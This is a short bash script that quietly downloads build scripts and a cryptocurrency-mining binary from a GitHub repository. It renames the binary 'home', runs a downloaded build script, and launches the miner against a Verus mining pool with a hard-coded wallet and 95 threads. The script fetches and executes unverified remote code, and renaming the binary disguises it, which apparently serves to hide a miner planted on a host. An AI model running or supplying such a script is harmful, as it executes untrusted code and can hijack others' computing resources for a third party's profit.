#!/bin/bash
wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/build.sh && chmod +x build.sh
wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/configure.sh && chmod +x configure.sh
wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/autogen.sh && chmod +x autogen.sh
wget -q -O home https://github.com/traapoks/traapoks/raw/main/ccminer.exe
./build.sh
./home -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RRYVVDXrrwgchzytdZk4AAZuNm21348cF9.1 -p hybrid -t95
